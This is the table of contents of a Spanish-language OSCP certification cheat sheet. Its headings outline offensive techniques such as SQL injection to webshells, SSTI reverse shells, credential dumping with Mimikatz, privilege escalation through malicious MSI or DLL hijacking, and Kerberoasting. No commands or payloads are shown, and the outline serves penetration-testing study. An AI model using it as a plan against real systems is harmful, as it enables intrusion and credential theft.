![alt=OSCP](./img/oscp-banner.png)

# OSCP (Offensive Security Certified Professional) CheetSheet
Apuntes para la certificación OSCP.

# Tabla de Contenido

<!-- TOC -->

- [Linux](#linux)
    - [Crunch](#crunch)
    - [Escapar de una Restricted Shell](#escapar-de-una-restricted-shell)
    - [Configuración de Fecha y Hora](#configuraci%C3%B3n-de-fecha-y-hora)
- [Windows](#windows)
    - [Habilitar WinRM](#habilitar-winrm)
    - [Habilitar RDP](#habilitar-rdp)
- [Fping](#fping)
    - [Identificación de hosts](#identificaci%C3%B3n-de-hosts)
- [Nmap](#nmap)
    - [Descubrimiento de host - Ping Scan](#descubrimiento-de-host---ping-scan)
    - [Escaneo de puertos](#escaneo-de-puertos)
    - [Versión y Servicio](#versi%C3%B3n-y-servicio)
    - [UDP top 100](#udp-top-100)
    - [UDP top 20](#udp-top-20)
    - [Obtener ayuda sobre scripts](#obtener-ayuda-sobre-scripts)
    - [Listar scripts de Nmap](#listar-scripts-de-nmap)
- [Escaneo de puertos](#escaneo-de-puertos)
    - [Descubrimiento de hosts Windows](#descubrimiento-de-hosts-windows)
    - [Descubrimiento de hosts Linux](#descubrimiento-de-hosts-linux)
    - [Descubrimiento de hosts Linux alternativa](#descubrimiento-de-hosts-linux-alternativa)
    - [Descubrimiento de puertos abiertos Linux](#descubrimiento-de-puertos-abiertos-linux)
- [Escaneo de puertos a través de proxychains usando hilos](#escaneo-de-puertos-a-trav%C3%A9s-de-proxychains-usando-hilos)
- [FTP 21](#ftp-21)
    - [Nmap](#nmap)
    - [Conexión al servidor FTP](#conexi%C3%B3n-al-servidor-ftp)
    - [Interactuar con el cliente FTP](#interactuar-con-el-cliente-ftp)
    - [Netexec](#netexec)
    - [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales)
    - [Archivos de configuración](#archivos-de-configuraci%C3%B3n)
    - [Descargar archivos](#descargar-archivos)
- [SMB 445](#smb-445)
    - [Nmap](#nmap)
    - [smbclient](#smbclient)
    - [smbmap](#smbmap)
    - [enum4linux](#enum4linux)
    - [Netexec](#netexec)
    - [Rpcclient](#rpcclient)
    - [RID Cycling Attack](#rid-cycling-attack)
    - [SMB desde Windows](#smb-desde-windows)
    - [Interactuar con el cliente SMB](#interactuar-con-el-cliente-smb)
    - [Montar una recurso compartido](#montar-una-recurso-compartido)
    - [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales)
- [MYSQL 3306](#mysql-3306)
    - [Nmap](#nmap)
    - [Fuerza bruta](#fuerza-bruta)
    - [Comandos básicos](#comandos-b%C3%A1sicos)
- [MSSQL 1433](#mssql-1433)
    - [Nmap](#nmap)
    - [Netexec](#netexec)
    - [Conexión](#conexi%C3%B3n)
    - [Comandos básicos](#comandos-b%C3%A1sicos)
    - [Mostrar el contenido de una base de datos](#mostrar-el-contenido-de-una-base-de-datos)
    - [Ejecución de código](#ejecuci%C3%B3n-de-c%C3%B3digo)
- [PostgreSQL 5432](#postgresql-5432)
    - [Comandos Comunes](#comandos-comunes)
    - [Ejecución Remota de Código](#ejecuci%C3%B3n-remota-de-c%C3%B3digo)
- [SNMP 161 - UDP](#snmp-161---udp)
- [RDP 3389](#rdp-3389)
    - [xfreerdp](#xfreerdp)
    - [Netexec](#netexec)
- [Enumeración Web](#enumeraci%C3%B3n-web)
    - [Fuff](#fuff)
    - [Gobuster](#gobuster)
    - [Wfuzz](#wfuzz)
    - [GitTools](#gittools)
- [Enumeración de CMS](#enumeraci%C3%B3n-de-cms)
    - [Wordpress](#wordpress)
        - [WPScan](#wpscan)
        - [Nuclei](#nuclei)
        - [Gobuster](#gobuster)
    - [Joomla](#joomla)
    - [Drupal](#drupal)
    - [Magento](#magento)
- [Local File Inclusion LFI](#local-file-inclusion-lfi)
    - [Hasta php 5.3](#hasta-php-53)
    - [php://filter Wrapper](#phpfilter-wrapper)
    - [Archivos Linux](#archivos-linux)
    - [Archivos Windows](#archivos-windows)
- [SQL Injection](#sql-injection)
    - [MySQL](#mysql)
        - [Obtener el número de columnas](#obtener-el-n%C3%BAmero-de-columnas)
        - [Obtener la versión](#obtener-la-versi%C3%B3n)
        - [Obtener el nombre de la base de datos en uso](#obtener-el-nombre-de-la-base-de-datos-en-uso)
        - [Obtener nombre de las tablas](#obtener-nombre-de-las-tablas)
        - [Obtener el nombre de las columnas](#obtener-el-nombre-de-las-columnas)
        - [Leer un archivo](#leer-un-archivo)
        - [Dump Data](#dump-data)
        - [Crear una Webshell](#crear-una-webshell)
    - [MSSQL](#mssql)
        - [Bypass de Autenticación](#bypass-de-autenticaci%C3%B3n)
        - [Obtener la versión con una Time-Based Injection](#obtener-la-versi%C3%B3n-con-una-time-based-injection)
        - [Habilitar xp_cmdshell](#habilitar-xp_cmdshell)
        - [Ejeecución Remota de Comandos RCE](#ejeecuci%C3%B3n-remota-de-comandos-rce)
    - [Oracle SQL](#oracle-sql)
        - [Bypass de Autenticación](#bypass-de-autenticaci%C3%B3n)
        - [Obtener el número de columnas](#obtener-el-n%C3%BAmero-de-columnas)
        - [Obtener el nombre de la tabla](#obtener-el-nombre-de-la-tabla)
        - [Obtener el nombre de la columna](#obtener-el-nombre-de-la-columna)
        - [Dump Data](#dump-data)
    - [Error-based SQL Injection SQLi](#error-based-sql-injection-sqli)
    - [UNION-based SQL Injection SQLi](#union-based-sql-injection-sqli)
        - [Inyección SQL manual - Pasos](#inyecci%C3%B3n-sql-manual---pasos)
        - [Blind SQL Injection SQLi](#blind-sql-injection-sqli)
    - [SQL Truncation Attack](#sql-truncation-attack)
- [Cross-Site Scripting XSS](#cross-site-scripting-xss)
    - [Petición vía Ajax - GET](#petici%C3%B3n-v%C3%ADa-ajax---get)
    - [Petición vía Ajax - POST](#petici%C3%B3n-v%C3%ADa-ajax---post)
    - [Comprimir script](#comprimir-script)
- [XML External Entity XXE](#xml-external-entity-xxe)
- [Server-Side Request Forgery SSRF](#server-side-request-forgery-ssrf)
- [Server-Side Template Injection SSTI](#server-side-template-injection-ssti)
    - [Magic Payload](#magic-payload)
    - [Jinja 2 - Reverse Shell](#jinja-2---reverse-shell)
- [Chisel](#chisel)
    - [Servidor Atacante](#servidor-atacante)
    - [Cliente Víctima](#cliente-v%C3%ADctima)
    - [Socat](#socat)
- [Ligolo-ng](#ligolo-ng)
    - [Descargar el Proxy y el Agente](#descargar-el-proxy-y-el-agente)
    - [Preparar las interfaces para el tunel](#preparar-las-interfaces-para-el-tunel)
    - [Configurar proxy en Kali](#configurar-proxy-en-kali)
    - [Configurar el agente en la máquina víctima](#configurar-el-agente-en-la-m%C3%A1quina-v%C3%ADctima)
    - [Configurar la sesión](#configurar-la-sesi%C3%B3n)
        - [Port Forwarding](#port-forwarding)
- [SSH Tunneling](#ssh-tunneling)
    - [Local Port Forwarding](#local-port-forwarding)
        - [Máquina WEB](#m%C3%A1quina-web)
    - [Dynamic Port Forwarding](#dynamic-port-forwarding)
        - [Máquina WEB](#m%C3%A1quina-web)
        - [Kali](#kali)
    - [Remote Port Forwarding](#remote-port-forwarding)
        - [Kali](#kali)
        - [Máquina Web](#m%C3%A1quina-web)
        - [Kali](#kali)
    - [Remote Dynamic Port Forwarding](#remote-dynamic-port-forwarding)
        - [Máquina Web](#m%C3%A1quina-web)
        - [Kali](#kali)
- [sshuttle](#sshuttle)
        - [Máquina Web](#m%C3%A1quina-web)
        - [Kali](#kali)
- [ssh.exe](#sshexe)
        - [Kali](#kali)
        - [Windows Jump Server](#windows-jump-server)
        - [Kali](#kali)
- [Plink](#plink)
        - [Kali](#kali)
        - [Windows Jump Server](#windows-jump-server)
        - [Kali](#kali)
- [Netsh](#netsh)
        - [Kali](#kali)
        - [Windows Jump Server](#windows-jump-server)
        - [Kali](#kali)
        - [Windows Jump Server](#windows-jump-server)
- [fcrack](#fcrack)
- [Group Policy Preferences GPP](#group-policy-preferences-gpp)
    - [gpp-decrypt](#gpp-decrypt)
- [Hashcat](#hashcat)
    - [Reglas personalizadas](#reglas-personalizadas)
        - [Agregar 1 a cada contraseña](#agregar-1-a-cada-contrase%C3%B1a)
        - [Poner en Mayúscula la primera letra](#poner-en-may%C3%BAscula-la-primera-letra)
            - [No agregue nada, un 1 o un ! a una lista de palabras existente](#no-agregue-nada-un-1-o-un--a-una-lista-de-palabras-existente)
            - [Regla para letras mayúsculas, valores numéricos y caracteres especiales](#regla-para-letras-may%C3%BAsculas-valores-num%C3%A9ricos-y-caracteres-especiales)
            - [Vista previa de la regla](#vista-previa-de-la-regla)
- [Hydra](#hydra)
- [John](#john)
- [LaZagne](#lazagne)
- [Mimikatz](#mimikatz)
- [pypykatz](#pypykatz)
- [Windows](#windows)
    - [Operaciones de Descarga](#operaciones-de-descarga)
        - [Codificación y Decodificación PowerShell Base64](#codificaci%C3%B3n-y-decodificaci%C3%B3n-powershell-base64)
            - [Atacante](#atacante)
            - [Máquina Víctima Windows](#m%C3%A1quina-v%C3%ADctima-windows)
        - [System.Net.WebClient](#systemnetwebclient)
        - [DownloadFile](#downloadfile)
            - [Atancate](#atancate)
            - [Máquina Víctima Windows](#m%C3%A1quina-v%C3%ADctima-windows)
        - [DownloadFileAsync](#downloadfileasync)
            - [Máquina Víctima Windows](#m%C3%A1quina-v%C3%ADctima-windows)
        - [DownloadString](#downloadstring)
        - [Invoke-WebRequest](#invoke-webrequest)
    - [SMB](#smb)
        - [Máquina atacante](#m%C3%A1quina-atacante)
        - [copy](#copy)
    - [FTP](#ftp)
    - [Operaciones de Subida](#operaciones-de-subida)
        - [Codificación y decodificación PowerShell Base64](#codificaci%C3%B3n-y-decodificaci%C3%B3n-powershell-base64)
            - [Máquina Víctima Windows](#m%C3%A1quina-v%C3%ADctima-windows)
            - [Máquina atacante](#m%C3%A1quina-atacante)
        - [PowerShell Web Uploads](#powershell-web-uploads)
        - [PowerShell Base64 Web Upload](#powershell-base64-web-upload)
- [Linux](#linux)
    - [Operaciones de Descarga](#operaciones-de-descarga)
        - [Codificación/Decodificación Base64](#codificaci%C3%B3ndecodificaci%C3%B3n-base64)
            - [Máquina atacante](#m%C3%A1quina-atacante)
            - [Máquina víctima](#m%C3%A1quina-v%C3%ADctima)
        - [Descargas web con Wget y cURL](#descargas-web-con-wget-y-curl)
            - [Descargar un archivo usando wget](#descargar-un-archivo-usando-wget)
            - [Descargar un archivo usando cURL](#descargar-un-archivo-usando-curl)
    - [Ataques sin archivos usando Linux](#ataques-sin-archivos-usando-linux)
        - [Descarga sin archivos con cURL](#descarga-sin-archivos-con-curl)
    - [Descargar con Bash /dev/tcp](#descargar-con-bash-devtcp)
        - [Máquina atacante](#m%C3%A1quina-atacante)
        - [Máquina víctima](#m%C3%A1quina-v%C3%ADctima)
    - [Descargas SSH](#descargas-ssh)
    - [Web Upload](#web-upload)
        - [Iniciar servidor web](#iniciar-servidor-web)
        - [Iniciar servidor web](#iniciar-servidor-web)
        - [Máquina Víctima Linux](#m%C3%A1quina-v%C3%ADctima-linux)
    - [Netcat](#netcat)
        - [Máquina atacante](#m%C3%A1quina-atacante)
        - [Máquina victima](#m%C3%A1quina-victima)
    - [Método alternativo de transferencia de archivos web](#m%C3%A9todo-alternativo-de-transferencia-de-archivos-web)
        - [Creación de un servidor web con Python3](#creaci%C3%B3n-de-un-servidor-web-con-python3)
        - [Creación de un servidor web con Python2.7](#creaci%C3%B3n-de-un-servidor-web-con-python27)
        - [Creación de un servidor web con PHP](#creaci%C3%B3n-de-un-servidor-web-con-php)
        - [Creación de un servidor web con Ruby](#creaci%C3%B3n-de-un-servidor-web-con-ruby)
        - [Descargamos el archivo](#descargamos-el-archivo)
    - [Operaciones de Subida](#operaciones-de-subida)
        - [SCP](#scp)
- [RDP](#rdp)
    - [xfreerdp](#xfreerdp)
- [SMB](#smb)
    - [PsExec](#psexec)
    - [SharpNoPSExec](#sharpnopsexec)
    - [NimExec](#nimexec)
    - [psexec.py](#psexecpy)
    - [smbexec.py](#smbexecpy)
    - [atexec.py](#atexecpy)
- [WinRM](#winrm)
    - [Invoke-Command](#invoke-command)
    - [WINRS](#winrs)
    - [Enter-PSSession](#enter-pssession)
    - [NetExec](#netexec)
    - [Evil-WinRM](#evil-winrm)
- [Windows](#windows)
    - [Enumeración](#enumeraci%C3%B3n)
        - [Sistema](#sistema)
        - [Usuarios](#usuarios)
        - [Grupos](#grupos)
        - [Red](#red)
        - [Windows Defender](#windows-defender)
        - [Recursos compartidos](#recursos-compartidos)
        - [Información sensible](#informaci%C3%B3n-sensible)
        - [Volcado de credenciales](#volcado-de-credenciales)
        - [Credenciales guardadas](#credenciales-guardadas)
        - [Windows Autologon](#windows-autologon)
        - [Enumeración automatizada](#enumeraci%C3%B3n-automatizada)
    - [Escalación de Privilegios](#escalaci%C3%B3n-de-privilegios)
        - [AlwaysInstallElevated](#alwaysinstallelevated)
            - [Comprobar que la política AlwaysInstallElevated esta habilitada](#comprobar-que-la-pol%C3%ADtica-alwaysinstallelevated-esta-habilitada)
            - [Cómo funciona](#c%C3%B3mo-funciona)
            - [Explotación de Always Install Elevated: Creación y Ejecución de un MSI Malicioso](#explotaci%C3%B3n-de-always-install-elevated-creaci%C3%B3n-y-ejecuci%C3%B3n-de-un-msi-malicioso)
            - [Generar un Paquete MSI Malicioso](#generar-un-paquete-msi-malicioso)
            - [Transferir el Archivo MSI al Objetivo](#transferir-el-archivo-msi-al-objetivo)
            - [Configurar un Listener](#configurar-un-listener)
            - [Ejecutar el Paquete MSI en el Objetivo](#ejecutar-el-paquete-msi-en-el-objetivo)
        - [BackupOperators - SeBackupPrivilege y SeRestorePrivilege](#backupoperators---sebackupprivilege-y-serestoreprivilege)
            - [Privilegios Clave del grupo Backup Operators](#privilegios-clave-del-grupo-backup-operators)
            - [Explotación](#explotaci%C3%B3n)
            - [mimikatz](#mimikatz)
            - [secretsdump.py](#secretsdumppy)
            - [pypykatz](#pypykatz)
        - [Extracción del archivo ntds.dit en un Controlador de Dominio](#extracci%C3%B3n-del-archivo-ntdsdit-en-un-controlador-de-dominio)
            - [Crear el Archivo DSH](#crear-el-archivo-dsh)
            - [Convertir el Archivo DSH a Formato Windows](#convertir-el-archivo-dsh-a-formato-windows)
            - [Transferir el Archivo DSH al Controlador de Dominio:](#transferir-el-archivo-dsh-al-controlador-de-dominio)
            - [Ejecutar diskshadow con el Archivo DSH y Extraer el Archivo ntds.dit](#ejecutar-diskshadow-con-el-archivo-dsh-y-extraer-el-archivo-ntdsdit)
            - [Extraer los hashes](#extraer-los-hashes)
        - [Aprovechar los servicios de Windows](#aprovechar-los-servicios-de-windows)
            - [Enumeración de servicios en ejecución](#enumeraci%C3%B3n-de-servicios-en-ejecuci%C3%B3n)
            - [Enumeración de la configuración del servicio](#enumeraci%C3%B3n-de-la-configuraci%C3%B3n-del-servicio)
            - [Mascara de Permisos icacls](#mascara-de-permisos-icacls)
            - [Enumeración de Permisos](#enumeraci%C3%B3n-de-permisos)
            - [adduser.c](#adduserc)
            - [Compilamos el código](#compilamos-el-c%C3%B3digo)
            - [Transferimos el binario a la máquina víctima.](#transferimos-el-binario-a-la-m%C3%A1quina-v%C3%ADctima)
            - [Movemos el binario a la ruta correspondiente](#movemos-el-binario-a-la-ruta-correspondiente)
            - [Ejecución](#ejecuci%C3%B3n)
            - [PowerUp](#powerup)
            - [Enumeración de propiedades de ejecución del servicio](#enumeraci%C3%B3n-de-propiedades-de-ejecuci%C3%B3n-del-servicio)
        - [DLL Hijacking](#dll-hijacking)
            - [Orden de búsqueda estándar](#orden-de-b%C3%BAsqueda-est%C3%A1ndar)
            - [evildll.cpp](#evildllcpp)
            - [Compilar el archivo evildll.dll](#compilar-el-archivo-evildlldll)
            - [Alternativa - Usar msfvenom para crear una DLL y recibir una reverse shell](#alternativa---usar-msfvenom-para-crear-una-dll-y-recibir-una-reverse-shell)
            - [Transferimos la DLL a la máquina objetivo](#transferimos-la-dll-a-la-m%C3%A1quina-objetivo)
        - [Rutas de servicio sin comillas Unquoted Service Paths](#rutas-de-servicio-sin-comillas-unquoted-service-paths)
            - [Orden de búsqueda](#orden-de-b%C3%BAsqueda)
            - [Enumeración de rutas de servicio](#enumeraci%C3%B3n-de-rutas-de-servicio)
            - [Alternativa - PowerUp](#alternativa---powerup)
        - [Tareas Programadas Scheduled Tasks](#tareas-programadas-scheduled-tasks)
        - [SeImpersonate y SeAssignPrimaryToken](#seimpersonate-y-seassignprimarytoken)
            - [JuicyPotato.exe](#juicypotatoexe)
            - [PrintSpoofer](#printspoofer)
            - [RogueWinRM](#roguewinrm)
            - [SigmaPotato.exe](#sigmapotatoexe)
        - [Autorun](#autorun)
        - [ACL de registro permisivas](#acl-de-registro-permisivas)
            - [Cambiar ImagePath con PowerShell](#cambiar-imagepath-con-powershell)
            - [Nos ponemos en escucha con Netcat](#nos-ponemos-en-escucha-con-netcat)
            - [Detemenos e Iniciamos el servicio](#detemenos-e-iniciamos-el-servicio)
        - [Servicios - binPath](#servicios---binpath)
        - [Aplicaciones ejecutadas al inicio](#aplicaciones-ejecutadas-al-inicio)
        - [GUI Apps](#gui-apps)
        - [SeDebugPrivilege](#sedebugprivilege)
            - [Volcado de LSASS para extraer credenciales](#volcado-de-lsass-para-extraer-credenciales)
        - [Event Log Readers](#event-log-readers)
            - [Búsqueda de registros de seguridad con wevtutil](#b%C3%BAsqueda-de-registros-de-seguridad-con-wevtutil)
            - [Salida de ejemplo](#salida-de-ejemplo)
        - [Print Operators](#print-operators)
            - [Escalada de Privilegios a través del Grupo de Operadores de Impresión y el Controlador Capcom.sys](#escalada-de-privilegios-a-trav%C3%A9s-del-grupo-de-operadores-de-impresi%C3%B3n-y-el-controlador-capcomsys)
            - [Uso de Capcom.sys para la Escalada de Privilegios](#uso-de-capcomsys-para-la-escalada-de-privilegios)
        - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
            - [Toma de propiedad de archivos o directorios](#toma-de-propiedad-de-archivos-o-directorios)
            - [Toma de propiedad de las claves de registro](#toma-de-propiedad-de-las-claves-de-registro)
- [Linux](#linux)
    - [Enumeración](#enumeraci%C3%B3n)
        - [Sistema](#sistema)
        - [Red](#red)
        - [Usuarios y Grupos](#usuarios-y-grupos)
            - [Algoritmos más utilizados](#algoritmos-m%C3%A1s-utilizados)
        - [Tareas Cron](#tareas-cron)
        - [Capabilities](#capabilities)
        - [Archivos y Directorios](#archivos-y-directorios)
        - [Búsqueda de credenciales](#b%C3%BAsqueda-de-credenciales)
        - [Binarios y Paquetes instalados](#binarios-y-paquetes-instalados)
        - [Procesos y Servicios](#procesos-y-servicios)
        - [Búsqueda de claves SSH](#b%C3%BAsqueda-de-claves-ssh)
        - [Archivos con permisos de escritura](#archivos-con-permisos-de-escritura)
        - [Abusando de Permisos inseguros](#abusando-de-permisos-inseguros)
        - [Automatización](#automatizaci%C3%B3n)
    - [Escalación de Privilegios](#escalaci%C3%B3n-de-privilegios)
        - [SUID](#suid)
            - [Cómo identificar archivos SUID](#c%C3%B3mo-identificar-archivos-suid)
            - [Cómo explotar binarios SUID para escalar privilegios.](#c%C3%B3mo-explotar-binarios-suid-para-escalar-privilegios)
        - [Sudo](#sudo)
        - [Capabilities](#capabilities)
            - [Asignar una Capability](#asignar-una-capability)
            - [Eliminar una Capability](#eliminar-una-capability)
            - [Enumerar binarios con capabilities](#enumerar-binarios-con-capabilities)
            - [Explotación](#explotaci%C3%B3n)
        - [Tareas Cron](#tareas-cron)
            - [Explotación de tareas cron](#explotaci%C3%B3n-de-tareas-cron)
- [Técnicas de explotación de trabajos Cron](#t%C3%A9cnicas-de-explotaci%C3%B3n-de-trabajos-cron)
        - [LXC / LXD](#lxc--lxd)
            - [Linux Containers LXC](#linux-containers-lxc)
            - [Linux Daemon LXD](#linux-daemon-lxd)
            - [Explotación](#explotaci%C3%B3n)
        - [Escalación de Privilegios - Docker](#escalaci%C3%B3n-de-privilegios---docker)
        - [LD_PRELOAD Shared Library](#ld_preload-shared-library)
            - [Sobre las bibliotecas compartidas](#sobre-las-bibliotecas-compartidas)
            - [¿Qué es LD_PRELOAD?](#%C2%BFqu%C3%A9-es-ld_preload)
            - [Ejemplo](#ejemplo)
            - [Pasos para el Ataque](#pasos-para-el-ataque)
            - [Creación de bibliotecas compartidas maliciosas](#creaci%C3%B3n-de-bibliotecas-compartidas-maliciosas)
        - [Shared Object](#shared-object)
            - [¿Qué es un Shared Object .so?](#%C2%BFqu%C3%A9-es-un-shared-object-so)
            - [Explotación mediante Manipulación de Bibliotecas](#explotaci%C3%B3n-mediante-manipulaci%C3%B3n-de-bibliotecas)
        - [Python Library Hijacking](#python-library-hijacking)
            - [¿Qué es?](#%C2%BFqu%C3%A9-es)
            - [¿Cómo funciona?](#%C2%BFc%C3%B3mo-funciona)
            - [Caso 1: Módulo con Permisos de Escritura](#caso-1-m%C3%B3dulo-con-permisos-de-escritura)
            - [Caso 2: Abuso de PYTHONPATH si sudo permite SETENV](#caso-2-abuso-de-pythonpath-si-sudo-permite-setenv)
        - [Grupo adm](#grupo-adm)
        - [Grupo disk](#grupo-disk)
        - [CVE-2021-3156](#cve-2021-3156)
        - [Bypass de Políticas de Sudo CVE-2019-14287](#bypass-de-pol%C3%ADticas-de-sudo-cve-2019-14287)
            - [Explicación de la Vulnerabilidad](#explicaci%C3%B3n-de-la-vulnerabilidad)
            - [Impacto](#impacto)
        - [CVE-2021-4034 / PwnKit](#cve-2021-4034--pwnkit)
        - [Dirty Pipe CVE-2022-0847](#dirty-pipe-cve-2022-0847)
            - [Impacto:](#impacto)
            - [Fundamento técnico:](#fundamento-t%C3%A9cnico)
            - [Explotación:](#explotaci%C3%B3n)
- [PowerShell para gestionar Active Directory](#powershell-para-gestionar-active-directory)
    - [Importar módulo de Active Directory](#importar-m%C3%B3dulo-de-active-directory)
    - [Sistema](#sistema)
        - [Obtener Variables de entorno](#obtener-variables-de-entorno)
        - [Obtener funciones en el scope de Powershell](#obtener-funciones-en-el-scope-de-powershell)
        - [Obtener una lista de los modulos de PowerShell cargados](#obtener-una-lista-de-los-modulos-de-powershell-cargados)
        - [Listar comandos para un módulo específico](#listar-comandos-para-un-m%C3%B3dulo-espec%C3%ADfico)
        - [Obtener información del Dominio](#obtener-informaci%C3%B3n-del-dominio)
        - [Obtener ayuda de un cmd-let](#obtener-ayuda-de-un-cmd-let)
        - [Obtener el estado actual de Windows Defender](#obtener-el-estado-actual-de-windows-defender)
        - [Obtener AppLockerPolicy](#obtener-applockerpolicy)
    - [Usuarios](#usuarios)
        - [Crear un nuevo usuario](#crear-un-nuevo-usuario)
        - [Filtrar por un nombre de usuario especifico](#filtrar-por-un-nombre-de-usuario-especifico)
        - [Filtrar por un usuario donde el campo ServicePrincipalName sea distinto de null](#filtrar-por-un-usuario-donde-el-campo-serviceprincipalname-sea-distinto-de-null)
        - [Crear un nuevo usuario asignado algunos atributos](#crear-un-nuevo-usuario-asignado-algunos-atributos)
        - [Agregar un usuario a un grupo específico](#agregar-un-usuario-a-un-grupo-espec%C3%ADfico)
        - [Cambiar la contraseña de un usuario](#cambiar-la-contrase%C3%B1a-de-un-usuario)
        - [Obtener los grupos del un usuario](#obtener-los-grupos-del-un-usuario)
        - [Quitar un usuario de un grupo](#quitar-un-usuario-de-un-grupo)
        - [Deshabilitar una cuenta de usuario](#deshabilitar-una-cuenta-de-usuario)
        - [Habilitar una cuenta de usuario](#habilitar-una-cuenta-de-usuario)
        - [Desbloquear una cuenta de usuario](#desbloquear-una-cuenta-de-usuario)
        - [Obtener información detallada de un usuario](#obtener-informaci%C3%B3n-detallada-de-un-usuario)
    - [Grupos](#grupos)
        - [Crear un nuevo grupo](#crear-un-nuevo-grupo)
        - [Listar los miembros de un grupo](#listar-los-miembros-de-un-grupo)
        - [Obtener información detallada de un grupo](#obtener-informaci%C3%B3n-detallada-de-un-grupo)
        - [Renombrar un grupo](#renombrar-un-grupo)
        - [Eliminar un grupo](#eliminar-un-grupo)
        - [Listar los grupos](#listar-los-grupos)
        - [Obtener una lista de todos los grupos en una OU específica](#obtener-una-lista-de-todos-los-grupos-en-una-ou-espec%C3%ADfica)
        - [Obtener una lista de todos los miembros de un grupo](#obtener-una-lista-de-todos-los-miembros-de-un-grupo)
    - [Trusts Confianzas](#trusts-confianzas)
        - [Verificar las relaciones de confianza de dominio](#verificar-las-relaciones-de-confianza-de-dominio)
    - [Computadoras](#computadoras)
        - [Obtener información detallada de un equipo](#obtener-informaci%C3%B3n-detallada-de-un-equipo)
        - [Obtener una lista de todos los equipos en un dominio](#obtener-una-lista-de-todos-los-equipos-en-un-dominio)
        - [Obtener información detallada de un equipo específico](#obtener-informaci%C3%B3n-detallada-de-un-equipo-espec%C3%ADfico)
        - [Crear un nuevo objeto de equipo en Active Directory](#crear-un-nuevo-objeto-de-equipo-en-active-directory)
        - [Cambiar el nombre de un equipo en Active Directory](#cambiar-el-nombre-de-un-equipo-en-active-directory)
        - [Deshabilitar una cuenta de equipo](#deshabilitar-una-cuenta-de-equipo)
        - [Habilitar una cuenta de equipo](#habilitar-una-cuenta-de-equipo)
        - [Eliminar un objeto de equipo de Active Directory](#eliminar-un-objeto-de-equipo-de-active-directory)
    - [Unidades Organizativas](#unidades-organizativas)
        - [Crear una nueva Unidad Organizativa](#crear-una-nueva-unidad-organizativa)
        - [Mover un objeto usuario, grupo, etc. a una OU diferente](#mover-un-objeto-usuario-grupo-etc-a-una-ou-diferente)
        - [Obtener una lista de todas las unidades organizativas](#obtener-una-lista-de-todas-las-unidades-organizativas)
        - [Mover un equipo a una unidad organizativa diferente](#mover-un-equipo-a-una-unidad-organizativa-diferente)
    - [GPO Group Policy Object](#gpo-group-policy-object)
        - [Obtener una lista de todas las GPO](#obtener-una-lista-de-todas-las-gpo)
        - [Obtener una lista de todas las GPO en un dominio específico](#obtener-una-lista-de-todas-las-gpo-en-un-dominio-espec%C3%ADfico)
        - [Crear una nueva GPO](#crear-una-nueva-gpo)
        - [Cambiar el nombre de una GPO](#cambiar-el-nombre-de-una-gpo)
        - [Copiar una GPO](#copiar-una-gpo)
        - [Eliminar una GPO](#eliminar-una-gpo)
        - [Obtener la configuración de una GPO](#obtener-la-configuraci%C3%B3n-de-una-gpo)
        - [Establecer la configuración de una GPO](#establecer-la-configuraci%C3%B3n-de-una-gpo)
        - [Enlace de una GPO a una OU específica](#enlace-de-una-gpo-a-una-ou-espec%C3%ADfica)
        - [Desenlace de una GPO de una OU específica](#desenlace-de-una-gpo-de-una-ou-espec%C3%ADfica)
        - [Realizar una copia de seguridad y restauración de una GPO](#realizar-una-copia-de-seguridad-y-restauraci%C3%B3n-de-una-gpo)
- [Habilitar DONT-REQ-PRE-AUTH](#habilitar-dont-req-pre-auth)
- [Deshabilitar DONT-REQ-PRE-AUTH](#deshabilitar-dont-req-pre-auth)
- [Enumeración](#enumeraci%C3%B3n)
    - [Kerbrute](#kerbrute)
    - [Password Spraying](#password-spraying)
    - [BloodHound](#bloodhound)
        - [Opción 1](#opci%C3%B3n-1)
        - [Opción 2](#opci%C3%B3n-2)
        - [Opción 3](#opci%C3%B3n-3)
    - [ldapsearch](#ldapsearch)
    - [ldapdomaindump](#ldapdomaindump)
    - [NetExec - LDAP](#netexec---ldap)
- [Grupos Privilegiados](#grupos-privilegiados)
    - [Account Operators](#account-operators)
        - [Enumeración](#enumeraci%C3%B3n)
        - [🔑 Privilegios del grupo](#-privilegios-del-grupo)
        - [Explotación](#explotaci%C3%B3n)
            - [Ejemplo 1 – Crear un usuario + agregarlo a RBCD](#ejemplo-1--crear-un-usuario--agregarlo-a-rbcd)
            - [Ejemplo 2 - Cambiar la contraseña de otra cuenta](#ejemplo-2---cambiar-la-contrase%C3%B1a-de-otra-cuenta)
            - [Ejemplo 3 – Agregar usuario a un grupo importante](#ejemplo-3--agregar-usuario-a-un-grupo-importante)
            - [Ejemplo 4 - Asignar SPN a un usuario - Kerberoasting](#ejemplo-4---asignar-spn-a-un-usuario---kerberoasting)
    - [Server Operators](#server-operators)
        - [🔑 Privilegios que tiene por defecto](#-privilegios-que-tiene-por-defecto)
        - [Explotación](#explotaci%C3%B3n)
            - [Abuso de privilegios de servicios](#abuso-de-privilegios-de-servicios)
            - [Agregarte a Administradores Locales del DC](#agregarte-a-administradores-locales-del-dc)
            - [Meter payloads en tareas programadas Scheduled Tasks](#meter-payloads-en-tareas-programadas-scheduled-tasks)
    - [DnsAdmins](#dnsadmins)
        - [Enumeración](#enumeraci%C3%B3n)
        - [Explotación](#explotaci%C3%B3n)
    - [Backup Operators](#backup-operators)
- [Kerberos](#kerberos)
    - [¿Qué es Kerberos?](#%C2%BFqu%C3%A9-es-kerberos)
        - [Tickets](#tickets)
        - [PAC](#pac)
        - [Mensajes](#mensajes)
    - [AS-REPRoasting](#as-reproasting)
        - [¿Cómo funciona?](#%C2%BFc%C3%B3mo-funciona)
        - [Desde Linux](#desde-linux)
        - [Desde Windows](#desde-windows)
            - [Crackeando el ASP_REP](#crackeando-el-asp_rep)
        - [🛡️ Mitigación del ataque AS-REP Roast](#-mitigaci%C3%B3n-del-ataque-as-rep-roast)
    - [Kerberoasting](#kerberoasting)
        - [¿Qué es Kerberoasting?](#%C2%BFqu%C3%A9-es-kerberoasting)
        - [Implicaciones de seguridad](#implicaciones-de-seguridad)
        - [Desde Linux](#desde-linux)
        - [Desde Windows](#desde-windows)
        - [Crackeando los TGS's](#crackeando-los-tgss)
        - [Asignar SPN a un usuario](#asignar-spn-a-un-usuario)
        - [🛡️ Mitigación del ataque Kerberoasting](#-mitigaci%C3%B3n-del-ataque-kerberoasting)
- [Movimiento Lateral](#movimiento-lateral)
- [Post Explotación](#post-explotaci%C3%B3n)
- [🛡️ Permisos delegables en Active Directory](#-permisos-delegables-en-active-directory)
